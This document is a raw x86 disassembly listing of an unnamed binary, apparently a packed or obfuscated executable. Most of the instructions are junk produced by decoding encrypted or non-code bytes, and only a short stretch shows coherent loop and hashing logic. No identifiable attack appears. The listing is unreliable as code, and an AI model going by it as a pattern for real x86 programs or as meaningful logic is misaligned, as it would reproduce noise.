  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40ebab
  40ebc0:	jns    0x40ebab
  40ebc2:	ins    DWORD PTR es:[edi],dx
  40ebc3:	jecxz  0x40ebe7
  40ebc5:	iretw  
  40ebc7:	das    
  40ebc8:	pop    edx
  40ebc9:	sub    ch,bl
  40ebcb:	dec    ebp
  40ebcc:	pop    ss
  40ebcd:	jmp    0x2899:0x4ad445df
  40ebd4:	cmp    eax,ebx
  40ebd6:	mov    dh,0xce
  40ebd8:	(bad)  
  40ebd9:	jb     0x40ebe4
  40ebdb:	fsubr  st(6),st
  40ebdd:	cwde   
  40ebde:	jae    0x40ec34
  40ebe0:	and    esi,DWORD PTR [ecx+0x6e]
  40ebe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe4:	into   
  40ebe5:	imul   esp,DWORD PTR [ebp+0x5f],0x37cad924
  40ebec:	mov    eax,ds:0xed92c1fd
  40ebf1:	shr    cl,1
  40ebf3:	into   
  40ebf4:	call   0xcd2b499d
  40ebf9:	clc    
  40ebfa:	stc    
  40ebfb:	inc    edi
  40ebfc:	inc    esp
  40ebfd:	loope  0x40ec09
  40ebff:	jno    0x40ec18
  40ec01:	fidivr WORD PTR [edi+eax*8]
  40ec04:	cmp    ecx,edx
  40ec06:	loope  0x40ebcf
  40ec08:	mov    esi,0xd91824c
  40ec0d:	xor    eax,0x6569fa90
  40ec12:	jl     0x40ebe6
  40ec14:	jmp    0x97168c4b
  40ec19:	mov    ebp,0x80c5dda
  40ec1e:	lock dec esi
  40ec20:	mov    bh,0xfa
  40ec22:	in     al,0x73
  40ec24:	jg     0x40ec34
  40ec26:	mov    esp,0x90dfae7c
  40ec2b:	xor    esi,esi
  40ec2d:	sub    eax,DWORD PTR [edi]
  40ec2f:	and    BYTE PTR [ebx-0x7d],ch
  40ec32:	leave  
  40ec33:	inc    ebp
  40ec34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec35:	pop    ecx
  40ec36:	cld    
  40ec37:	aad    0x35
  40ec39:	inc    ebx
  40ec3a:	(bad)  
  40ec3b:	jo     0x40ec69
  40ec3d:	inc    eax
  40ec3e:	push   0xffffffb4
  40ec40:	push   es
  40ec41:	(bad)  
  40ec42:	pop    ds
  40ec43:	and    DWORD PTR ds:0xb54b7d99,0xffffffc6
  40ec4a:	sbb    bl,BYTE PTR [ecx+0x69]
  40ec4d:	popf   
  40ec4e:	mov    bl,0xbe
  40ec50:	sub    al,0xed
  40ec52:	pop    edx
  40ec53:	das    
  40ec54:	sbb    BYTE PTR [ebx+0x45],0x3a
  40ec58:	ror    ebx,1
  40ec5a:	xchg   DWORD PTR ds:0x1714a1f9,ebx
  40ec60:	fnstcw WORD PTR [ebx+0x52]
  40ec63:	hlt    
  40ec64:	mov    eax,ds:0x74a11cea
  40ec69:	push   0xffffffbd
  40ec6b:	and    al,BYTE PTR [edi+0x7e]
  40ec6e:	jp     0x40ec9b
  40ec70:	js     0x40ecd9
  40ec72:	push   esp
  40ec73:	inc    esi
  40ec74:	add    eax,0x1bbff19b
  40ec79:	cmp    eax,0xa54bfa49
  40ec7e:	mov    esp,0x4540003e
  40ec83:	mov    eax,0x70c0c00d
  40ec88:	jecxz  0x40eccd
  40ec8a:	cmp    ebp,DWORD PTR [ecx-0x13]
  40ec8d:	out    dx,al
  40ec8e:	(bad)  
  40ec8f:	out    0x1,al
  40ec91:	xchg   ecx,eax
  40ec92:	pop    ebx
  40ec93:	push   esp
  40ec94:	jb     0x40ec66
  40ec96:	or     al,0x6b
  40ec98:	ja     0x40ed03
  40ec9a:	or     ch,BYTE PTR [eax]
  40ec9c:	add    eax,0xffffffc5
  40ec9f:	in     eax,dx
  40eca0:	sbb    al,0xe9
  40eca2:	test   al,0xd7
  40eca4:	push   ecx
  40eca5:	jb     0x40ed0c
  40eca7:	add    edi,DWORD PTR [esi-0x589698e0]
  40ecad:	mov    dh,0x9b
  40ecaf:	lock stc 
  40ecb1:	mov    eax,ds:0x3a51a764
  40ecb6:	mov    ah,0x20
  40ecb8:	mov    dh,BYTE PTR [edx]
  40ecba:	add    DWORD PTR [ecx-0x4],eax
  40ecbd:	sub    al,0x1b
  40ecbf:	push   es
  40ecc0:	inc    ebp
  40ecc1:	dec    edx
  40ecc2:	rcr    BYTE PTR [edx],cl
  40ecc4:	push   ecx
  40ecc5:	add    al,bh
  40ecc7:	shl    DWORD PTR [edi+0x19],cl
  40ecca:	(bad)  
  40eccb:	and    eax,0x9284dee6
  40ecd0:	jno    0x40ec8b
  40ecd2:	jne    0x40ed23
  40ecd4:	stos   DWORD PTR es:[edi],eax
  40ecd5:	dec    esi
  40ecd6:	add    bh,BYTE PTR [ebp+0x6845792d]
  40ecdc:	mov    eax,0x2b1dbd7c
  40ece1:	lods   al,BYTE PTR ds:[esi]
  40ece2:	or     al,0x1c
  40ece4:	dec    esi
  40ece5:	stos   BYTE PTR es:[edi],al
  40ece6:	arpl   ax,bp
  40ece8:	mov    ds,WORD PTR [edi+0x1f]
  40eceb:	popa   
  40ecec:	dec    edi
  40eced:	hlt    
  40ecee:	ret    
  40ecef:	xor    al,0x3f
  40ecf1:	jo     0x40ecfa
  40ecf3:	stos   DWORD PTR es:[edi],eax
  40ecf4:	inc    bl
  40ecf6:	aam    0xf7
  40ecf8:	and    eax,0x71
  40ecfb:	jae    0x40ec7f
  40ecfd:	test   bh,0x5b
  40ed00:	or     eax,0x71003ce9
  40ed05:	xchg   edi,eax
  40ed06:	mov    bh,0xfd
  40ed08:	lock sbb eax,0xc23a3f80
  40ed0e:	dec    BYTE PTR [ecx+0x193799e4]
  40ed14:	loopne 0x40ed79
  40ed16:	mul    al
  40ed18:	sbb    esi,DWORD PTR [ecx]
  40ed1a:	jb     0x40ed00
  40ed1c:	jbe    0x40ed10
  40ed1e:	pop    edx
  40ed1f:	pop    ecx
  40ed20:	and    dh,BYTE PTR [edi+0x50]
  40ed23:	addr16 nop
  40ed25:	adc    al,0x10
  40ed27:	out    0xa2,al
  40ed29:	(bad)  [edi+ebx*2]
  40ed2c:	fwait
  40ed2d:	pop    esp
  40ed2e:	je     0x40ed90
  40ed30:	mov    ebp,0x320ad2ce
  40ed35:	and    edx,edi
  40ed37:	ins    DWORD PTR es:[edi],dx
  40ed38:	icebp  
  40ed39:	inc    esi
  40ed3a:	int    0x76
  40ed3c:	mov    bl,0x44
  40ed3e:	sbb    cl,BYTE PTR [eax+0x68]
  40ed41:	push   cs
  40ed42:	mov    dl,0xc5
  40ed44:	dec    ebp
  40ed45:	jl     0x40edb9
  40ed47:	mov    ah,0x15
  40ed49:	cmp    eax,0xab9d5949
  40ed4e:	cld    
  40ed4f:	add    ah,BYTE PTR [esi]
  40ed51:	pusha  
  40ed52:	push   0xffffffc0
  40ed54:	mov    esi,0x116bdfce
  40ed59:	pop    ds
  40ed5a:	xchg   ebp,eax
  40ed5b:	fcom   QWORD PTR [ebx+0x47]
  40ed5e:	xchg   esp,eax
  40ed5f:	aaa    
  40ed60:	call   0x6d60:0x6f8bd46b
  40ed67:	fs inc ax
  40ed6a:	adc    eax,0xdfb71d6a
  40ed6f:	aam    0x90
  40ed71:	pop    eax
  40ed72:	push   ecx
  40ed73:	into   
  40ed74:	push   ecx
  40ed75:	jae    0x40ed14
  40ed77:	rol    BYTE PTR [esi+0x72],0xb0
  40ed7b:	or     ecx,esp
  40ed7d:	daa    
  40ed7e:	add    eax,0x8f4db74c
  40ed83:	std    
  40ed84:	leave  
  40ed85:	jge    0x40ed38
  40ed87:	push   ebp
  40ed88:	mov    BYTE PTR [esi+0x2d6f15cc],al
  40ed8e:	push   ss
  40ed8f:	mov    esp,0x72e9fe98
  40ed94:	add    eax,DWORD PTR [esi+0x33685ebd]
  40ed9a:	ret    0xd2b
  40ed9d:	shl    DWORD PTR [edi],cl
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x1358b659]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	dec    ecx
  40ee77:	push   0x886e2172
  40ee7c:	xchg   esi,eax
  40ee7d:	inc    ebp
  40ee7e:	ret    0x6fd6
  40ee81:	mov    al,0xf4
  40ee83:	sbb    dl,BYTE PTR [edx]
  40ee85:	fmul   st,st(0)
  40ee87:	add    ah,0xee
  40ee8a:	pop    es
  40ee8b:	iret   
  40ee8c:	jmp    0x40e5d9cc
  40ee91:	int    0xd5
  40ee93:	xchg   BYTE PTR [edi+esi*1],cl
  40ee96:	sub    ah,dh
  40ee98:	push   ds
  40ee99:	mov    al,ds:0xdb7dc92b
  40ee9e:	pusha  
  40ee9f:	push   ss
  40eea0:	mov    ds:0x5abca53f,eax
  40eea5:	outs   dx,DWORD PTR ds:[esi]
  40eea6:	rol    BYTE PTR [ecx+ecx*4],cl
  40eea9:	dec    ebp
  40eeaa:	adc    edi,DWORD PTR ss:[esi+0x1d]
  40eeae:	pop    esp
  40eeaf:	ins    DWORD PTR es:[edi],dx
  40eeb0:	dec    edi
  40eeb1:	data16 test al,0x2f
  40eeb4:	xor    ah,cl
  40eeb6:	imul   edi,DWORD PTR [esi-0x7788ae48],0x77
  40eebd:	cmp    al,0x40
  40eebf:	push   ds
  40eec0:	xchg   edx,eax
  40eec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec2:	lock mov ebx,0xee66f1af
  40eec8:	mov    BYTE PTR [ebx-0x1c24f14c],ch
  40eece:	dec    edi
  40eecf:	sub    ebp,DWORD PTR ss:[edx-0x73]
  40eed3:	call   0x377e:0x4ba056e6
  40eeda:	xor    DWORD PTR [esp+eiz*8-0xb],ecx
  40eede:	enter  0x996c,0x9
  40eee2:	or     edx,DWORD PTR [ebx+ebx*4+0x5f75a770]
  40eee9:	pop    edi
  40eeea:	push   0x998b6ec8
  40eeef:	sbb    al,dl
  40eef1:	dec    esp
  40eef2:	xchg   edi,eax
  40eef3:	dec    edx
  40eef4:	mov    eax,ds:0xe6efe0dd
  40eef9:	cdq    
  40eefa:	mov    eax,0xc4f1c4ba
  40eeff:	xchg   esi,eax
  40ef00:	test   DWORD PTR [eax+ebp*1],0xa1fc32ae
  40ef07:	jnp    0x40ee95
  40ef09:	int    0x95
  40ef0b:	or     eax,DWORD PTR [edx+0x7f]
  40ef0e:	mov    bh,0xbe
  40ef10:	inc    eax
  40ef11:	add    eax,0x8355517c
  40ef16:	cmp    eax,0x6c28da2a
  40ef1b:	or     ecx,DWORD PTR [ebx+edi*1-0x26]
  40ef1f:	inc    ecx
  40ef20:	test   DWORD PTR [eax+0x63],edi
  40ef23:	iret   
  40ef24:	ds mov cl,0xae
  40ef27:	jns    0x40eead
  40ef29:	and    BYTE PTR [eax+0x23f658a0],ch
  40ef2f:	nop
  40ef30:	lahf   
  40ef31:	jg     0x40eede
  40ef33:	dec    edx
  40ef34:	push   edi
  40ef35:	jle    0x40ef18
  40ef37:	(bad)  
  40ef39:	push   ebx
  40ef3a:	mov    ds:0x8d9fb522,eax
  40ef3f:	bound  esp,QWORD PTR [eax+0x3b557497]
  40ef45:	stos   BYTE PTR es:[edi],al
  40ef46:	sub    bh,ah
  40ef48:	bound  ax,DWORD PTR [ecx+0x3dd8f37f]
  40ef4f:	bound  edi,QWORD PTR [ecx-0x4cdce414]
  40ef55:	cmp    BYTE PTR [edi-0x1f45be29],ah
  40ef5b:	add    edx,esp
  40ef5d:	or     DWORD PTR [eax-0x2d52614a],0x25
  40ef64:	cmp    ch,al
  40ef66:	sub    al,0xe9
  40ef68:	push   esp
  40ef69:	xor    al,BYTE PTR [ecx-0xc]
  40ef6c:	daa    
  40ef6d:	popf   
  40ef6e:	imul   esp,DWORD PTR [ecx+0x7f939bfc],0x32
  40ef75:	cli    
  40ef76:	jecxz  0x40ef4f
  40ef78:	or     DWORD PTR [edi],edx
  40ef7a:	pop    ss
  40ef7b:	push   edx
  40ef7c:	dec    edi
  40ef7d:	inc    ebp
  40ef7e:	mov    eax,0x9b59e6a7
  40ef83:	cli    
  40ef84:	mov    BYTE PTR [ebp+0x6a],ah
  40ef87:	lock push edx
  40ef89:	xlat   BYTE PTR ds:[ebx]
  40ef8a:	mov    ecx,0xacaa141b
  40ef8f:	jns    0x40ef4b
  40ef91:	fbstp  TBYTE PTR [ebx]
  40ef93:	call   0x9e31:0x5ebf91db
  40ef9a:	outs   dx,BYTE PTR ds:[esi]
  40ef9b:	out    0x28,al
  40ef9d:	mov    WORD PTR [ebp-0x4],?
  40efa0:	pop    eax
  40efa1:	sub    edi,DWORD PTR [esi]
  40efa3:	sub    ebx,DWORD PTR [edx+0x43]
  40efa6:	sub    ebx,DWORD PTR [eax+0x14]
  40efa9:	into   
  40efaa:	and    bh,BYTE PTR [edx+0x42]
  40efad:	mov    al,0x72
  40efaf:	out    0x5d,al
  40efb1:	pop    ss
  40efb2:	loope  0x40effa
  40efb4:	loope  0x40ef3f
  40efb6:	adc    dh,BYTE PTR ds:0x2370c3e7
  40efbc:	jne    0x40f01d
  40efbe:	dec    ebx
  40efbf:	jo     0x40efa5
  40efc1:	shl    BYTE PTR ds:0x82c179d0,1
  40efc7:	push   ebx
  40efc8:	iret   
  40efc9:	ss mov ch,0xfc
  40efcc:	repnz sub al,0xb3
  40efcf:	push   edi
  40efd0:	push   ds
  40efd1:	push   eax
  40efd2:	rol    BYTE PTR ds:0x35a993ba,1
  40efd8:	mov    es,esi
  40efda:	iret   
  40efdb:	cmp    edi,DWORD PTR [ecx+0x36]
  40efde:	fstp   TBYTE PTR [edi+0x62091303]
  40efe4:	in     al,dx
  40efe5:	es enter 0xb333,0x67
  40efea:	mov    ebx,0x801d2434
  40efef:	daa    
  40eff0:	push   ebx
  40eff1:	pop    esp
  40eff2:	aam    0x2c
  40eff4:	leave  
  40eff5:	jbe    0x40f072
  40eff7:	pop    eax
  40eff8:	sub    al,0x4f
  40effa:	push   ecx
  40effb:	in     al,0x23
  40effd:	ds popa 
  40efff:	scas   eax,DWORD PTR es:[edi]
  40f000:	cmp    DWORD PTR [eax-0x7f],0x304db31d
  40f007:	retf   0x4017
  40f00a:	jbe    0x40eff5
  40f00c:	dec    ebx
  40f00d:	fwait
  40f00e:	xchg   esi,eax
  40f00f:	fdivrp st(2),st
  40f011:	cwde   
  40f012:	lods   eax,DWORD PTR ds:[esi]
  40f013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f014:	adc    eax,0x10f89cfe
  40f019:	lock xchg ebp,eax
  40f01b:	loop   0x40eff6
  40f01d:	push   0xf164515b
  40f022:	out    0x10,eax
  40f024:	jns    0x40f06f
  40f026:	pop    ss
  40f027:	lea    esi,[edx+0x77]
  40f02a:	gs nop
  40f02c:	jge    0x40efd5
  40f02e:	sbb    BYTE PTR [edi+0x7d],ch
  40f031:	push   edx
  40f032:	mov    al,0xdc
  40f034:	or     cl,bh
  40f036:	add    ch,al
  40f038:	test   eax,0xdec84731
  40f03d:	data16 dec BYTE PTR [eax-0xe]
  40f041:	scas   eax,DWORD PTR es:[edi]
  40f042:	retf   0x467c
  40f045:	xchg   BYTE PTR [ecx+0x50],dl
  40f048:	das    
  40f049:	std    
  40f04a:	fcmovnu st,st(4)
  40f04c:	stos   BYTE PTR es:[edi],al
  40f04d:	sub    ah,bh
  40f04f:	(bad)  
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x75ed1594,ebx
  40f076:	retf   0xd675
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	ins    DWORD PTR es:[edi],dx
  40f081:	rcl    BYTE PTR [edx*4+0x695db1b8],1
  40f088:	mov    esi,0xff0dbaf6
  40f08d:	das    
  40f08e:	and    al,0xc8
  40f090:	cmp    DWORD PTR [esi],eax
  40f092:	xor    DWORD PTR [ecx],0x8bfc52
  40f098:	sahf   
  40f099:	lock push es
  40f09b:	jmp    0xdfd3b189
  40f0a0:	push   0xffffff8c
  40f0a2:	loope  0x40f0c6
  40f0a4:	push   ebx
  40f0a5:	out    dx,al
  40f0a6:	mov    ds:0x5f7346d6,eax
  40f0ab:	push   ds
  40f0ac:	add    DWORD PTR [esi+0x49],esp
  40f0af:	lds    ebx,FWORD PTR [esi-0x34]
  40f0b2:	add    DWORD PTR [eax-0x33],esi
  40f0b5:	call   0xc16f:0x5534159
  40f0bc:	stc    
  40f0bd:	dec    ecx
  40f0be:	test   eax,0xb0ed00e
  40f0c3:	inc    eax
  40f0c4:	(bad)  
  40f0c5:	sti    
  40f0c6:	scas   al,BYTE PTR es:[edi]
  40f0c7:	push   esp
  40f0c8:	mov    edx,0xeee4a78c
  40f0cd:	iret   
  40f0ce:	dec    edi
  40f0cf:	jp     0x40f0fe
  40f0d1:	cmp    eax,0xd8f76513
  40f0d6:	fadd   st(6),st
  40f0d8:	sub    edi,DWORD PTR [ebp+0x695c8bb4]
  40f0de:	push   0xffffff8d
  40f0e0:	addr16 ss jge 0x40f12d
  40f0e4:	xchg   BYTE PTR [esi+0x9],al
  40f0e7:	cmp    eax,0x40c2fed3
  40f0ec:	sar    DWORD PTR [ebp-0x71418f26],cl
  40f0f2:	loope  0x40f149
  40f0f4:	retf   
  40f0f5:	cmp    dh,0xf8
  40f0f8:	sub    eax,0xc0ea07e2
  40f0fd:	sbb    edx,esi
  40f0ff:	iret   
  40f100:	mov    ds:0x77e159fb,al
  40f105:	icebp  
  40f106:	fs push ss
  40f108:	pop    ds
  40f109:	aad    0x53
  40f10b:	das    
  40f10c:	push   0x6a
  40f10e:	xchg   ecx,eax
  40f10f:	adc    esi,DWORD PTR [ebx+0x6a]
  40f112:	addr16 xor bh,0xc3
  40f116:	fdivr  st,st(6)
  40f118:	mov    edx,0x96021bae
  40f11d:	push   0xb0d4cc5f
  40f122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f123:	sub    al,BYTE PTR [eax]
  40f125:	imul   edx,ebx,0xffffffb9
  40f128:	mov    ecx,0x9ac9fef5
  40f12d:	xor    dh,ch
  40f12f:	stc    
  40f130:	mov    edx,0x693c4498
  40f135:	pushf  
  40f136:	adc    eax,0x272ef4a1
  40f13b:	dec    ebp
  40f13c:	lahf   
  40f13d:	or     eax,0x37c0f557
  40f142:	mov    esp,0xed28cd2b
  40f147:	mov    dh,0xc5
  40f149:	adc    DWORD PTR ds:0x4562b7c9,esp
  40f14f:	cmp    edx,DWORD PTR [esi-0x69]
  40f152:	stos   BYTE PTR es:[edi],al
  40f153:	dec    esp
  40f154:	int    0x90
  40f156:	jne    0x40f104
  40f158:	push   edx
  40f159:	rol    BYTE PTR [ecx+0x4f945db8],1
  40f15f:	rol    BYTE PTR [eax+0xc3aa9ee],1
  40f165:	(bad)  
  40f166:	mov    ebp,0xbc0e2c2
  40f16b:	jns    0x40f13a
  40f16d:	and    ah,BYTE PTR [edx]
  40f16f:	int    0x15
  40f171:	jmp    0x4359639c
  40f176:	jbe    0x40f13d
  40f178:	sub    esp,DWORD PTR [eax]
  40f17a:	cli    
  40f17b:	stos   BYTE PTR es:[edi],al
  40f17c:	loop   0x40f14d
  40f17e:	jnp    0x40f1b0
  40f180:	sbb    eax,0xf7f6436d
  40f185:	in     eax,dx
  40f186:	or     edi,DWORD PTR [esi+0x2c1edf19]
  40f18c:	test   eax,ebx
  40f18e:	add    dl,BYTE PTR [eax]
  40f190:	ins    DWORD PTR es:[edi],dx
  40f191:	sbb    DWORD PTR [ebp-0xa],eax
  40f194:	dec    ecx
  40f195:	and    esp,DWORD PTR [ecx+0x59]
  40f198:	xchg   esi,eax
  40f199:	sub    eax,0xb6494764
  40f19e:	cli    
  40f19f:	popa   
  40f1a0:	mov    bl,BYTE PTR [esi+0x26c4e6b]
  40f1a6:	retf   0xfbe6
  40f1a9:	outs   dx,BYTE PTR ds:[esi]
  40f1aa:	imul   ecx,DWORD PTR [ebp-0x7bf91de6],0x6a
  40f1b1:	and    DWORD PTR [edi],edx
  40f1b3:	adc    BYTE PTR [esp+edi*1-0x3f],cl
  40f1b7:	out    dx,eax
  40f1b8:	and    BYTE PTR [ebx],al
  40f1ba:	adc    bh,BYTE PTR [ecx]
  40f1bc:	(bad)  
  40f1bd:	jne    0x40f237
  40f1bf:	dec    edi
  40f1c0:	cmc    
  40f1c1:	pusha  
  40f1c2:	daa    
  40f1c3:	sbb    al,0x7e
  40f1c5:	jno    0x40f243
  40f1c7:	pushf  
  40f1c8:	jge    0x40f16e
  40f1ca:	pop    eax
  40f1cb:	rol    DWORD PTR [ecx],1
  40f1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ce:	iret   
  40f1cf:	mov    bh,0xa2
  40f1d1:	jecxz  0x40f154
  40f1d3:	popf   
  40f1d4:	dec    esp
  40f1d5:	into   
  40f1d6:	in     eax,0x65
  40f1d8:	push   ss
  40f1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1da:	icebp  
  40f1db:	stos   BYTE PTR es:[edi],al
  40f1dc:	idiv   BYTE PTR ds:0x8268a36d
  40f1e2:	mov    ebx,0xf29466fc
  40f1e7:	jno    0x40f1a6
  40f1e9:	jnp    0x40f256
  40f1eb:	push   ecx
  40f1ec:	shr    DWORD PTR [edi],0x23
  40f1ef:	dec    edx
  40f1f0:	xchg   esi,eax
  40f1f1:	pop    esp
  40f1f2:	xchg   edx,eax
  40f1f3:	pop    esi
  40f1f4:	in     al,dx
  40f1f5:	dec    edx
  40f1f6:	nop
  40f1f7:	sbb    DWORD PTR ds:0xc2e7eb3b,esp
  40f1fd:	add    bl,bl
  40f1ff:	cdq    
  40f200:	sbb    ecx,edi
  40f202:	mov    edx,DWORD PTR [ecx+esi*4+0x435bcd03]
  40f209:	cmc    
  40f20a:	push   ds
  40f20b:	aam    0x2
  40f20d:	fcomp  DWORD PTR [eax+0x40]
  40f210:	dec    ebp
  40f211:	mov    al,0x3
  40f213:	iret   
  40f214:	data16 fwait
  40f216:	and    eax,DWORD PTR [ebp+0x6e]
  40f219:	sub    eax,0xece17507
  40f21e:	jp     0x40f242
  40f220:	dec    ebx
  40f221:	jns    0x40f287
  40f223:	xchg   edx,eax
  40f224:	cmp    eax,0xe82c2fb3
  40f229:	es cmovle ebx,ebp
  40f22d:	mov    DWORD PTR [edx-0x14e68f78],eax
  40f233:	xor    DWORD PTR [ebx-0x4a],ebp
  40f236:	(bad)  
  40f237:	sbb    eax,0x2743b268
  40f23c:	add    ah,0xc
  40f23f:	adc    BYTE PTR [ecx],ch
  40f241:	or     al,BYTE PTR [eax+0x2bc8eb07]
  40f247:	add    al,0xe9
  40f249:	pop    ebp
  40f24a:	jb     0x40f239
  40f24c:	mov    esp,0xac691095
  40f251:	lods   al,BYTE PTR ds:[esi]
  40f252:	jns    0x40f24f
  40f254:	nop
  40f255:	add    al,ah
  40f257:	mov    bh,0x1c
  40f259:	jo     0x40f1fc
  40f25b:	inc    edx
  40f25c:	dec    ebx
  40f25d:	xchg   ecx,eax
  40f25e:	xchg   edx,eax
  40f25f:	test   al,0xc9
  40f261:	mov    ch,BYTE PTR [edi+0x1a]
  40f264:	and    DWORD PTR [eax],ebp
  40f266:	ret    
  40f267:	cmc    
  40f268:	push   esp
  40f269:	xor    BYTE PTR [esp+edi*8+0x38],0x94
  40f26e:	aaa    
  40f26f:	mov    esi,0x1f9fd872
  40f274:	push   eax
  40f275:	mov    dh,0x7b
  40f277:	pop    ebx
  40f278:	dec    esi
  40f279:	mov    BYTE PTR [eax],dl
  40f27b:	pop    eax
  40f27c:	es int 0xee
  40f27f:	fiadd  DWORD PTR [edx+0x377871a9]
  40f285:	imul   edi,ebx,0xdd993944
  40f28b:	out    dx,eax
  40f28c:	arpl   WORD PTR [ebx+0x7f],ax
  40f28f:	std    
  40f290:	xchg   BYTE PTR [edx],bh
  40f292:	add    edi,DWORD PTR [eax]
  40f294:	lahf   
  40f295:	mov    dl,0x97
  40f297:	sbb    eax,0x99348d07
  40f29c:	sbb    ah,BYTE PTR ds:0xc5daa1e5
  40f2a2:	xor    eax,0xffffffc5
  40f2a5:	repnz outs dx,DWORD PTR ds:[esi]
  40f2a8:	adc    BYTE PTR [ecx+0x60c47a4c],bl
  40f2ae:	scas   al,BYTE PTR es:[edi]
  40f2af:	lods   al,BYTE PTR ds:[esi]
  40f2b0:	rcr    DWORD PTR [esi+0x4fd42ddf],1
  40f2b6:	es stos BYTE PTR es:[edi],al
  40f2b8:	add    eax,0xd896798b
  40f2bd:	jb     0x40f323
  40f2bf:	popf   
  40f2c0:	mov    esi,0xcfd8788e
  40f2c5:	xchg   esp,eax
  40f2c6:	rcr    BYTE PTR [ecx+eiz*4+0x6173924e],cl
  40f2cd:	neg    BYTE PTR [ecx-0x22]
  40f2d0:	inc    ecx
  40f2d1:	data16 lock add bh,dl
  40f2d5:	div    DWORD PTR [ebx+0x7564aa04]
  40f2db:	dec    esp
  40f2dc:	pop    ebx
  40f2dd:	sbb    ebx,DWORD PTR [edi+0x2]
  40f2e0:	cmp    al,0x2f
  40f2e2:	dec    ebp
  40f2e3:	dec    edi
  40f2e4:	mov    ch,0xa2
  40f2e6:	add    bh,bl
  40f2e8:	fdiv   DWORD PTR [eax+0x1eba5f5a]
  40f2ee:	repz inc ebx
  40f2f0:	daa    
  40f2f1:	adc    DWORD PTR [eax],eax
  40f2f3:	arpl   sp,bx
  40f2f5:	add    eax,0x9369f1b9
  40f2fa:	fwait
  40f2fb:	out    dx,eax
  40f2fc:	jmp    0x6223:0xa092b4c0
  40f303:	clc    
  40f304:	sub    al,0x18
  40f306:	mov    eax,DWORD PTR [ebx]
  40f308:	sbb    DWORD PTR [edx+0x55],0x2921a4e2
  40f30f:	sub    al,0x10
  40f311:	sub    al,0x22
  40f313:	mov    ebx,0x2814086
  40f318:	stc    
  40f319:	arpl   WORD PTR [ecx+eax*4-0x2f],di
  40f31d:	mov    eax,ds:0xb4fb3888
  40f322:	pop    ebx
  40f323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f324:	cmp    ebp,DWORD PTR [edi]
  40f326:	push   ecx
  40f327:	dec    eax
  40f328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f329:	mov    edi,0x7f5e005
  40f32e:	loop   0x40f2d9
  40f330:	and    DWORD PTR [eax+ebx*1+0x2c],0x47f016e2
  40f338:	xor    DWORD PTR ds:0x28789264,eax
  40f33e:	xchg   ebx,eax
  40f33f:	pusha  
  40f340:	add    DWORD PTR [esi-0x5eb7f014],0x50c95bfb
  40f34a:	mov    esp,0x4a706e45
  40f34f:	lahf   
  40f350:	xlat   BYTE PTR ds:[ebx]
  40f351:	inc    edx
  40f352:	pop    eax
  40f353:	add    al,bh
  40f355:	mov    ch,0x18
  40f357:	call   0x6af801a5
  40f35c:	and    al,0x8b
